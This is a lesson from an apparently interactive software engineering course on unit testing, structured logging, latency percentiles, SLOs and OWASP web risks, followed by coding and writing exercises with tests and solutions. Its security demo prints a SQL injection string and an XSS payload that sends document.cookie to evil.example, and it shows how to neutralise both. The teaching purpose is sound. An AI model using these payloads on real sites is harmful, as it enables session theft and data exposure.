---
id: ops-quality
title: Testing, observability, reliability and security
minutes: 60
---

Shipping code is half the job. The other half is proving it works before release, knowing when it breaks afterwards, and keeping attackers out. These habits are what most distinguish experienced engineers.

## Testing

A test runs your code and checks the result automatically. Tests let you change code without fear, which is the real reason to write them.

| Level | What it exercises | Speed | How many |
| --- | --- | --- | --- |
| Unit | One function or class, with dependencies replaced by fakes | Milliseconds | Most of the suite |
| Integration | Your code with a real database, cache or queue | Seconds | Some |
| End-to-end | The whole system through its API or UI | Slow and brittle | A few critical paths |

This shape is the **test pyramid**. Python ships with `unittest`, so this runs anywhere:

```python run
import unittest

class OutOfStock(Exception):
    pass

class OrderService:
    def __init__(self, stock_repo, notifier):
        self.stock_repo, self.notifier = stock_repo, notifier
    def place(self, item, qty):
        if qty <= 0:
            raise ValueError("quantity must be positive")
        available = self.stock_repo.get(item)
        if qty > available:
            raise OutOfStock(f"only {available} left")
        self.stock_repo.set(item, available - qty)
        self.notifier.send(f"order placed: {qty} x {item}")
        return {"item": item, "qty": qty, "status": "confirmed"}

class FakeStock:                                    # a fake: a simple working stand-in
    def __init__(self, data): self.data = dict(data)
    def get(self, item): return self.data.get(item, 0)
    def set(self, item, qty): self.data[item] = qty

class SpyNotifier:                                  # a spy: records how it was called
    def __init__(self): self.messages = []
    def send(self, message): self.messages.append(message)

class OrderServiceTest(unittest.TestCase):
    def setUp(self):
        self.stock, self.notifier = FakeStock({"gearbox": 5}), SpyNotifier()
        self.service = OrderService(self.stock, self.notifier)

    def test_places_order_and_reduces_stock(self):
        result = self.service.place("gearbox", 2)
        self.assertEqual(result["status"], "confirmed")
        self.assertEqual(self.stock.get("gearbox"), 3)
        self.assertEqual(len(self.notifier.messages), 1)

    def test_rejects_more_than_stock_and_changes_nothing(self):
        with self.assertRaises(OutOfStock):
            self.service.place("gearbox", 6)
        self.assertEqual(self.stock.get("gearbox"), 5)
        self.assertEqual(self.notifier.messages, [])

    def test_rejects_zero_and_negative_quantity(self):
        for qty in (0, -1):
            with self.assertRaises(ValueError):
                self.service.place("gearbox", qty)

    def test_exactly_all_stock_is_allowed(self):         # boundary case
        self.service.place("gearbox", 5)
        self.assertEqual(self.stock.get("gearbox"), 0)

unittest.main(argv=["x"], exit=False, verbosity=2)
```

`pytest` is the tool most teams use; the same tests become plain functions with `assert`.

What makes tests good:

- **Arrange, act, assert**: set up, do one thing, check the outcome.
- **Test behaviour, not implementation**: assert on results and side effects through public interfaces. Tests that know internal details break on every refactor.
- **Cover the edges**: empty, zero, one, maximum, duplicates, invalid input, permission denied, dependency failure.
- **Independent and repeatable**: no reliance on order, the clock, the network or leftover data.
- **Fast**: a slow suite does not get run.
- **Coverage** shows which lines never ran. A high number does not prove the assertions are meaningful.

Other kinds: **contract tests** (two services agree on an API shape), **load tests** (k6, Locust, to find the breaking point), **property-based tests** (generate many random inputs and check an invariant), and **test-driven development** (write the failing test first).

## Observability

You cannot fix what you cannot see. Three signals answer three different questions.

| Signal | Answers | Tools |
| --- | --- | --- |
| Logs | What exactly happened in this request? | Structured JSON to Loki, Elasticsearch, CloudWatch |
| Metrics | How is the system behaving overall, over time? | Prometheus and Grafana, Datadog |
| Traces | Where did this request spend its time across services? | OpenTelemetry to Jaeger, Tempo, Datadog |

### Structured logging

Log key-value pairs, not prose, so a machine can filter and aggregate them.

```python run
import json, logging, sys, time, uuid

class JsonFormatter(logging.Formatter):
    def format(self, record):
        payload = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "level": record.levelname, "msg": record.getMessage()}
        payload.update(getattr(record, "fields", {}))
        return json.dumps(payload)

handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(JsonFormatter())
log = logging.getLogger("api")
log.addHandler(handler); log.setLevel(logging.INFO); log.propagate = False

request_id = str(uuid.uuid4())[:8]
start = time.perf_counter()
log.info("order placed", extra={"fields": {"request_id": request_id, "user_id": 42, "order_id": 981}})
log.warning("slow query", extra={"fields": {"request_id": request_id, "table": "orders", "duration_ms": 840}})
log.info("request finished", extra={"fields": {"request_id": request_id, "status": 201, "duration_ms": round((time.perf_counter() - start) * 1000, 2)}})
```

- Use levels: DEBUG, INFO, WARNING, ERROR.
- Put a **request ID** in every line and pass it to downstream services, so one request can be followed everywhere.
- Never log passwords, tokens, card numbers or personal data.

### Metrics

Numbers sampled over time, cheap to store and fast to query.

- **Counter**: only goes up (requests served, errors).
- **Gauge**: goes up and down (memory in use, queue length).
- **Histogram**: the distribution of values (request duration), from which percentiles are computed.

Report latency as **percentiles**. The average hides the users who suffer.

```python run
import random, statistics

random.seed(7)
latencies = [random.gauss(120, 20) for _ in range(980)] + [random.uniform(1500, 4000) for _ in range(20)]   # 2% very slow
latencies.sort()

def percentile(values, p):
    return values[min(len(values) - 1, int(len(values) * p / 100))]

print(f"average: {statistics.mean(latencies):6.0f} ms")
for p in (50, 95, 99):
    print(f"p{p}    : {percentile(latencies, p):6.0f} ms")
```

The p50 is the typical user; the p99 is one request in a hundred. A user who loads a page making fifty calls will hit the p99 often.

Two checklists for what to measure:

- **RED** for a service: **R**ate of requests, **E**rrors, **D**uration.
- **USE** for a resource: **U**tilisation, **S**aturation, **E**rrors, for CPU, memory, disk and connections.

The **four golden signals** combine them: latency, traffic, errors, saturation.

### Tracing

A trace follows one request through every service. Each unit of work is a **span** with a start time, a duration and a parent. The trace ID travels in a request header. A trace shows at a glance that a 2-second request spent 1.8 seconds in one database query. **OpenTelemetry** is the vendor-neutral standard for emitting all three signals.

## Reliability vocabulary

| Term | Meaning | Example |
| --- | --- | --- |
| SLI (indicator) | A measured number | Share of requests answered in under 300 ms |
| SLO (objective) | The target for it | 99.9% over 30 days |
| SLA (agreement) | A contract with consequences | Credits if availability drops below 99.5% |
| Error budget | 100% minus the SLO | 0.1% of requests may fail this month |

The error budget turns reliability into a decision rule: while budget remains, ship features; when it is spent, stop and fix reliability.

```python run
slo = 0.999
requests_this_month = 40_000_000
failed_so_far = 31_000

budget = requests_this_month * (1 - slo)
print(f"error budget : {budget:,.0f} failed requests allowed")
print(f"used         : {failed_so_far:,} ({failed_so_far / budget:.0%})")
print("decision     :", "keep shipping features" if failed_so_far < budget * 0.8 else "slow down and prioritise reliability")
```

**Alerting**: page a human only for a symptom users feel that needs action now, such as a high error rate or a burning error budget. Everything else goes to a dashboard or a ticket. Alerts that fire without needing action train people to ignore them.

**Incident response**: mitigate first (roll back, scale up, switch the feature off), communicate, find the cause afterwards. Then write a **blameless postmortem**: timeline, impact, root causes, what went well, and action items with owners. The question is what in the system allowed the mistake, not who made it.

## Security

The OWASP Top 10 lists the most common web application risks. These are the ones you will be asked about.

| Risk | Example | Defence |
| --- | --- | --- |
| Broken access control | Changing `/orders/981` to `/orders/982` shows another user's order | Check ownership and role on every request; deny by default |
| Injection | Input concatenated into SQL or a shell command | Parameterised queries; never build commands from input |
| Cryptographic failures | Passwords in plain text; HTTP instead of HTTPS | TLS everywhere; slow salted password hashes; encrypt sensitive data at rest |
| Security misconfiguration | Debug mode on; default passwords; a public storage bucket | Hardened defaults; infrastructure as code; reviews |
| Vulnerable components | An old library with a known exploit | Dependency scanning; pinned, updated versions |
| Authentication failures | No rate limit on login | Covered in [authentication](#be-auth) |
| SSRF | The server fetches a user-supplied URL that points at an internal service | Allowlist destinations; block private address ranges |
| XSS | A comment containing a script tag runs in other users' browsers | Escape output; Content Security Policy |
| Insecure deserialisation | Loading untrusted pickled objects runs attacker code | Never unpickle untrusted data; use JSON |
| Insufficient logging | A breach goes unnoticed for months | Log security events and alert on them |

Two of them in action:

```python run
import html, sqlite3

# 1. SQL injection
db = sqlite3.connect(":memory:")
db.executescript("CREATE TABLE users (name TEXT, secret TEXT); INSERT INTO users VALUES ('asha','a-key'),('ravi','r-key');")
attack = "x' OR '1'='1"
print("unsafe:", db.execute(f"SELECT secret FROM users WHERE name = '{attack}'").fetchall())
print("safe  :", db.execute("SELECT secret FROM users WHERE name = ?", (attack,)).fetchall())

# 2. Cross-site scripting
comment = '<script>fetch("https://evil.example/?c=" + document.cookie)</script>'
print("unsafe page:", f"<p>{comment}</p>")
print("safe page  :", f"<p>{html.escape(comment)}</p>")
```

Broader habits:

- **Validate all input at the boundary**: type, length, range, format. Reject what you do not expect.
- **Least privilege** for every user, service account and database login.
- **Secrets in a secret manager**, rotated, never in code or logs.
- **Defence in depth**: assume any one layer can fail.
- **Keep dependencies updated** and scan them (`pip-audit`, Dependabot).
- **Encrypt** in transit and at rest.
- **Threat modelling**: for each feature ask what could go wrong, who would try it, and what stops them.

This course's own server is a small example: it binds to `127.0.0.1` so only your machine can reach it, requires a random token on every POST so that another website cannot ask it to run code, limits request size, and runs examples in a separate process with a time limit. Read `app.py` and find each one.

LLM applications add their own risks, such as prompt injection. See [evals and operations](#ai-evals-ops).

## Check yourself

```quiz
[
  {"q": "Why should most tests be unit tests?", "options": ["They are the only kind that finds bugs", "They are fast and pinpoint failures, so they can run on every change", "Integration tests are forbidden"], "answer": 1, "why": "The pyramid keeps feedback fast while a few broader tests check that the parts connect."},
  {"q": "A test asserts that a private helper method was called three times. What is the risk?", "options": ["None", "It breaks when the code is refactored even though behaviour is unchanged", "It runs too slowly"], "answer": 1, "why": "Test observable behaviour, not internal structure."},
  {"q": "Average latency is 150 ms but users complain. What should you look at?", "options": ["The median only", "High percentiles such as p95 and p99", "CPU temperature"], "answer": 1, "why": "Averages hide the slow tail that some users hit on every page."},
  {"q": "Your SLO is 99.9% and the error budget for the month is used up. What does the policy say?", "options": ["Ship faster", "Prioritise reliability work over new features", "Change the SLO quietly"], "answer": 1, "why": "The budget is the agreed limit on unreliability."},
  {"q": "What is the correct defence against SQL injection?", "options": ["Removing quotes from input", "Parameterised queries", "A longer password"], "answer": 1, "why": "Data is sent separately from the query text, so it cannot change the query's structure."},
  {"q": "Which request should wake an engineer at night?", "options": ["Disk at 60%", "Checkout error rate at 30% for five minutes", "One slow request"], "answer": 1, "why": "Page on user-facing symptoms that need immediate action."}
]
```

## Practice

Each task below has a problem statement, examples and starter code. Press **Start practicing**, write your solution, then **Run tests** (code tasks) or **AI review** (written tasks).

````task
id: transfer-with-fakes
title: Service layer tested with a fake repository
kind: code
level: medium
@@statement
A service layer should be testable without a database. Build a service function and the **fake** it is tested against; the tests then reach every branch, including the failures.

**`InsufficientFunds`**: an exception class (already in the starter).

**`FakeAccountRepo(balances)`**: an in-memory repository. `balances` is a dict `account_id -> int cents`; copy it.
- `get_balance(account_id)`: return the balance, or raise `KeyError` for an unknown account.
- `set_balance(account_id, value)`: store it and append `(account_id, value)` to the list attribute `writes`.

**`transfer(repo, src, dst, amount)`**: move `amount` cents from `src` to `dst`.
- `amount <= 0` raises `ValueError`; `src == dst` raises `ValueError`.
- An unknown account raises `KeyError` (the repo does this).
- If `src` has less than `amount`, raise `InsufficientFunds`.
- On any error **nothing may be written** (`repo.writes` stays empty).
- On success write both balances (source first) and return `(new_src_balance, new_dst_balance)`.

**Example**

```
repo = FakeAccountRepo({"a": 100, "b": 50})
transfer(repo, "a", "b", 30)   -> (70, 80)
repo.writes                    -> [("a", 70), ("b", 80)]
```
@@starter
class InsufficientFunds(Exception):
    pass

class FakeAccountRepo:
    def __init__(self, balances):
        pass

    def get_balance(self, account_id):
        pass

    def set_balance(self, account_id, value):
        pass

def transfer(repo, src, dst, amount):
    pass
@@tests
_r = FakeAccountRepo({"a": 100, "b": 50})
assert transfer(_r, "a", "b", 30) == (70, 80), "happy path"
assert _r.writes == [("a", 70), ("b", 80)], "both balances written, in order"
assert _r.get_balance("a") == 70, "repo state updated"
def _fails(exc, *args):
    repo = FakeAccountRepo({"a": 100, "b": 50})
    try:
        transfer(repo, *args)
    except exc:
        return repo.writes == []
    return False
assert _fails(ValueError, "a", "b", 0), "zero amount"
assert _fails(ValueError, "a", "b", -5), "negative amount"
assert _fails(ValueError, "a", "a", 10), "same account"
assert _fails(InsufficientFunds, "a", "b", 101), "not enough money"
assert _fails(KeyError, "zzz", "b", 10), "unknown source"
assert _fails(KeyError, "a", "zzz", 10), "unknown destination must not debit the source"
_r2 = FakeAccountRepo({"a": 100, "b": 0})
assert transfer(_r2, "a", "b", 100) == (0, 100), "moving the whole balance is allowed"
_src = {"a": 5}
FakeAccountRepo(_src).set_balance("a", 9)
assert _src == {"a": 5}, "fake copies its input"
@@hint
Read both balances first (`get_balance` raises `KeyError`), validate, and only then call `set_balance` twice, so a failure can never leave a half-done transfer.
@@solution
class InsufficientFunds(Exception):
    pass

class FakeAccountRepo:
    def __init__(self, balances):
        self._b = dict(balances)
        self.writes = []

    def get_balance(self, account_id):
        return self._b[account_id]

    def set_balance(self, account_id, value):
        self._b[account_id] = value
        self.writes.append((account_id, value))

def transfer(repo, src, dst, amount):
    if amount <= 0 or src == dst:
        raise ValueError("invalid transfer")
    src_balance = repo.get_balance(src)
    dst_balance = repo.get_balance(dst)
    if src_balance < amount:
        raise InsufficientFunds(src)
    repo.set_balance(src, src_balance - amount)
    repo.set_balance(dst, dst_balance + amount)
    return (src_balance - amount, dst_balance + amount)
````

````task
id: json-request-log
title: Structured JSON logs with a request ID
kind: code
level: easy
@@statement
Write two functions that produce structured log lines.

**`log_json(level, message, request_id, **fields)`**: return a one-line **JSON string** of an object with the keys `level`, `message`, `request_id` and every extra keyword field, keys sorted alphabetically (`json.dumps(..., sort_keys=True)`).

**`request_log(request_id, method, path, status, start, end)`**: `start` and `end` are timestamps in seconds (floats). Return `log_json(...)` with message `"request"` and the extra fields `method`, `path`, `status` and `duration_ms` = `round((end - start) * 1000, 1)`. The level is `"ERROR"` for status 500 and above, `"WARNING"` for 400-499, otherwise `"INFO"`.

**Example**

```
request_log("r-17", "GET", "/items", 200, 100.0, 100.25)
-> '{"duration_ms": 250.0, "level": "INFO", "message": "request", "method": "GET", "path": "/items", "request_id": "r-17", "status": 200}'
```
@@starter
import json

def log_json(level, message, request_id, **fields):
    pass

def request_log(request_id, method, path, status, start, end):
    pass
@@tests
import json as _json
_line = log_json("INFO", "hello", "r-1", user="ann", n=3)
assert isinstance(_line, str) and "\n" not in _line, "one-line string"
assert _json.loads(_line) == {"level": "INFO", "message": "hello", "request_id": "r-1", "user": "ann", "n": 3}, "all fields present"
assert _line.index('"level"') < _line.index('"message"') < _line.index('"n"') < _line.index('"request_id"') < _line.index('"user"'), "sorted keys"
_r = request_log("r-17", "GET", "/items", 200, 100.0, 100.25)
assert _r == '{"duration_ms": 250.0, "level": "INFO", "message": "request", "method": "GET", "path": "/items", "request_id": "r-17", "status": 200}', "exact example"
assert _json.loads(request_log("r-2", "POST", "/x", 404, 1.0, 1.0))["level"] == "WARNING", "4xx is a warning"
assert _json.loads(request_log("r-3", "POST", "/x", 500, 1.0, 2.0))["level"] == "ERROR", "5xx is an error"
assert _json.loads(request_log("r-3", "POST", "/x", 399, 1.0, 2.0))["level"] == "INFO", "3xx is info"
assert _json.loads(request_log("r-4", "GET", "/", 200, 5.0, 5.0))["duration_ms"] == 0.0, "zero duration"
@@hint
Build a dict `{"level": level, "message": message, "request_id": request_id}`, `update(fields)`, then `json.dumps(record, sort_keys=True)`.
@@solution
import json

def log_json(level, message, request_id, **fields):
    record = {"level": level, "message": message, "request_id": request_id}
    record.update(fields)
    return json.dumps(record, sort_keys=True)

def request_log(request_id, method, path, status, start, end):
    level = "ERROR" if status >= 500 else "WARNING" if status >= 400 else "INFO"
    return log_json(level, "request", request_id, method=method, path=path,
                    status=status, duration_ms=round((end - start) * 1000, 1))
````

````task
id: percentiles
title: p50, p95 and p99 of request durations
kind: code
level: easy
@@statement
Write two functions to summarise the request durations collected in one minute.

**`percentile(values, p)`**: the **nearest-rank** percentile. Sort the values ascending; the rank is `ceil(p * n / 100)` (n = number of values), at least 1; return the value at that rank (1-based).
- `values`: non-empty list of numbers; `p`: a number from 0 to 100.
- Empty `values` raises `ValueError`. The input list must not be modified.

**`summary(values)`**: return `{"p50": ..., "p95": ..., "p99": ...}` using `percentile`.

**Example**

```
percentile([15, 20, 35, 40, 50], 50)   -> 35
percentile([15, 20, 35, 40, 50], 95)   -> 50
summary(list(range(1, 101)))           -> {"p50": 50, "p95": 95, "p99": 99}
```
@@starter
import math

def percentile(values, p):
    pass

def summary(values):
    pass
@@tests
assert percentile([15, 20, 35, 40, 50], 50) == 35, "p50 of five"
assert percentile([15, 20, 35, 40, 50], 95) == 50, "p95 of five"
assert summary(list(range(1, 101))) == {"p50": 50, "p95": 95, "p99": 99}, "summary of 1..100"
_v = [9, 1, 5]
assert percentile(_v, 0) == 1 and percentile(_v, 100) == 9, "p0 is the minimum, p100 the maximum"
assert _v == [9, 1, 5], "input not modified"
assert percentile([7], 99) == 7, "single value"
assert percentile([1, 2, 3, 4], 50) == 2, "rank 2 of four"
assert summary([100, 1, 1, 1, 1, 1, 1, 1, 1, 1]) == {"p50": 1, "p95": 100, "p99": 100}, "a slow outlier shows in p95"
_bad = False
try:
    percentile([], 50)
except ValueError:
    _bad = True
assert _bad, "empty list raises ValueError"
@@hint
`rank = max(1, math.ceil(p * len(values) / 100))`, then `sorted(values)[rank - 1]`. Multiply by `p` before dividing to avoid float surprises.
@@solution
import math

def percentile(values, p):
    if not values:
        raise ValueError("no values")
    ordered = sorted(values)
    rank = max(1, math.ceil(p * len(ordered) / 100))
    return ordered[rank - 1]

def summary(values):
    return {"p50": percentile(values, 50), "p95": percentile(values, 95), "p99": percentile(values, 99)}
````

````task
id: slo-error-budget
title: SLO and monthly error budget
kind: code
level: medium
@@statement
Your SLI is "share of requests that succeed" and your SLO is a target percentage. Write two functions.

**`error_budget(slo_percent, total_requests, failed_requests)`** returns a dict:
- `"allowed_failures"`: `total_requests * (100 - slo_percent) / 100`, rounded to 2 decimals.
- `"remaining"`: `allowed_failures - failed_requests`, rounded to 2 decimals (negative when the budget is blown).
- `"burn_percent"`: `failed_requests / allowed_failures * 100`, rounded to 2 decimals. If `allowed_failures` is 0: `0.0` when there were no failures, otherwise `float("inf")`.

**`downtime_minutes(slo_percent, days=30)`**: minutes of full outage the SLO allows in `days` days: `days * 24 * 60 * (100 - slo_percent) / 100`, rounded to 2 decimals.

**Example**

```
error_budget(99.9, 1000000, 250)
-> {"allowed_failures": 1000.0, "remaining": 750.0, "burn_percent": 25.0}
downtime_minutes(99.9)   -> 43.2
```
@@starter
def error_budget(slo_percent, total_requests, failed_requests):
    pass

def downtime_minutes(slo_percent, days=30):
    pass
@@tests
assert error_budget(99.9, 1000000, 250) == {"allowed_failures": 1000.0, "remaining": 750.0, "burn_percent": 25.0}, "example"
assert error_budget(99.9, 1000000, 1500) == {"allowed_failures": 1000.0, "remaining": -500.0, "burn_percent": 150.0}, "budget exceeded"
assert error_budget(99, 200, 0) == {"allowed_failures": 2.0, "remaining": 2.0, "burn_percent": 0.0}, "no failures"
assert error_budget(100, 500, 0)["burn_percent"] == 0.0, "100% SLO, no failures"
assert error_budget(100, 500, 1)["burn_percent"] == float("inf"), "100% SLO, any failure"
assert downtime_minutes(99.9) == 43.2, "three nines per 30 days"
assert downtime_minutes(99.99) == 4.32, "four nines"
assert downtime_minutes(99, days=7) == 100.8, "one week at 99%"
@@hint
Compute and round `allowed` once, then derive the other two values from it. Handle `allowed == 0` before dividing.
@@solution
def error_budget(slo_percent, total_requests, failed_requests):
    allowed = round(total_requests * (100 - slo_percent) / 100, 2)
    if allowed == 0:
        burn = 0.0 if failed_requests == 0 else float("inf")
    else:
        burn = round(failed_requests / allowed * 100, 2)
    return {"allowed_failures": allowed, "remaining": round(allowed - failed_requests, 2), "burn_percent": burn}

def downtime_minutes(slo_percent, days=30):
    return round(days * 24 * 60 * (100 - slo_percent) / 100, 2)
````

````task
id: attack-and-fix
title: Fix SQL injection, XSS and broken access control
kind: code
level: medium
@@statement
Three classic holes, three small fixes.

**1. `build_user_query(name)`**: return a tuple `(sql, params)` for looking a user up by name with a **placeholder**, never string concatenation. The SQL must be exactly `"SELECT id, name FROM users WHERE name = ?"` and `params` the tuple `(name,)`.

**2. `escape_html(text)`**: return `text` safe to insert into an HTML page: `&`, `<`, `>`, `"` and `'` become entities (`html.escape(text, quote=True)` does this).

**3. `get_note(notes, current_user, note_id)`**: `notes` is a dict `note_id -> {"owner": str, "text": str}`.
- unknown `note_id`: return `None`
- note owned by another user: raise `PermissionError`
- otherwise return the note's `text`

**Example**

```
build_user_query("ann")                  -> ("SELECT id, name FROM users WHERE name = ?", ("ann",))
escape_html("<script>alert(1)</script>") -> "&lt;script&gt;alert(1)&lt;/script&gt;"
get_note({1: {"owner": "ann", "text": "hi"}}, "bob", 1)   # raises PermissionError
```
@@starter
import html

def build_user_query(name):
    pass

def escape_html(text):
    pass

def get_note(notes, current_user, note_id):
    pass
@@tests
import sqlite3 as _sql
assert build_user_query("ann") == ("SELECT id, name FROM users WHERE name = ?", ("ann",)), "placeholder query"
_db = _sql.connect(":memory:")
_db.execute("CREATE TABLE users (id INTEGER, name TEXT)")
_db.execute("INSERT INTO users VALUES (1, 'ann'), (2, 'bob')")
_q, _p = build_user_query("ann")
assert _db.execute(_q, _p).fetchall() == [(1, "ann")], "normal lookup works"
_q, _p = build_user_query("x' OR '1'='1")
assert _db.execute(_q, _p).fetchall() == [], "injection payload is treated as plain data"
assert escape_html("<script>alert(1)</script>") == "&lt;script&gt;alert(1)&lt;/script&gt;", "script tag"
assert escape_html('a & "b" \'c\'') == "a &amp; &quot;b&quot; &#x27;c&#x27;", "quotes and ampersand"
assert escape_html("plain") == "plain", "plain text unchanged"
_notes = {1: {"owner": "ann", "text": "hi"}, 2: {"owner": "bob", "text": "secret"}}
assert get_note(_notes, "ann", 1) == "hi", "own note"
assert get_note(_notes, "ann", 99) is None, "unknown id"
_denied = False
try:
    get_note(_notes, "ann", 2)
except PermissionError:
    _denied = True
assert _denied, "another user's note is refused"
@@hint
Keep user data out of the SQL string entirely. Check ownership on the server with `note["owner"] != current_user`; hiding ids in the UI is not protection.
@@solution
import html

def build_user_query(name):
    return ("SELECT id, name FROM users WHERE name = ?", (name,))

def escape_html(text):
    return html.escape(text, quote=True)

def get_note(notes, current_user, note_id):
    note = notes.get(note_id)
    if note is None:
        return None
    if note["owner"] != current_user:
        raise PermissionError("not your note")
    return note["text"]
````

````task
id: blameless-postmortem
title: Blameless postmortem
kind: text
level: medium
@@statement
Scenario (use these facts): on Tuesday a developer, Sam, merged a migration that dropped the index on `orders.customer_id`. It was deployed at **14:05**. At **14:20** the p95 latency of `GET /orders` rose from 120 ms to 4 s and the error rate reached 9%. The on-call engineer was paged at **14:22**, found full table scans in the slow-query log at **14:35**, and rolled back the migration at **14:50**; metrics were normal at **14:55**. About 2,300 customers saw errors. The staging database had only 1,000 rows, so the problem did not show there, and the review checklist had no item about indexes.

**Deliverable**: a blameless postmortem of 150-300 words with these headings: **Summary**, **Impact**, **Timeline** (timestamped entries), **Root cause**, **What went well**, **Action items** (exactly three, each with an owner role and a deadline).

Write about systems and process, not about Sam as a person.
@@criteria
- Has all required headings and a timeline using the given times (14:05, 14:20, 14:22, 14:35, 14:50, 14:55) in order.
- Impact is quantified: about 35 minutes of degradation (14:20-14:55), 9% errors, latency 120 ms to 4 s, about 2,300 customers.
- Root cause names the dropped index and why it was not caught (small staging data, no checklist item), not "Sam made a mistake".
- Language is blameless: no blame on a person; refers to "the change" or roles.
- Exactly three concrete, preventive action items, each with an owner role and a deadline (for example production-sized staging data, a CI check or checklist item for index changes, a latency alert that pages quickly).
@@solution
**Summary**: A migration deployed at 14:05 dropped the index on `orders.customer_id`, making `GET /orders` slow and error-prone for about 35 minutes.

**Impact**: From 14:20 to 14:55, p95 latency rose from 120 ms to 4 s and 9% of requests failed. About 2,300 customers saw errors.

**Timeline**
- 14:05 migration deployed
- 14:20 latency and errors rise
- 14:22 on-call paged
- 14:35 slow-query log shows full table scans on `orders`
- 14:50 migration rolled back
- 14:55 metrics back to normal

**Root cause**: The migration removed an index the orders query depends on. Staging holds only 1,000 rows, so a full scan looked fast there, and the review checklist had no item for index changes, so the process let the change reach production unchecked.

**What went well**: paging fired within 2 minutes and a rollback was available.

**Action items**
1. Load staging with production-sized anonymised data (Platform lead, within 4 weeks).
2. Add a CI check and a review checklist item that flags dropped indexes (Tech lead, within 2 weeks).
3. Add a p95 latency alert at 1 s that pages within 5 minutes (On-call owner, within 1 week).
````
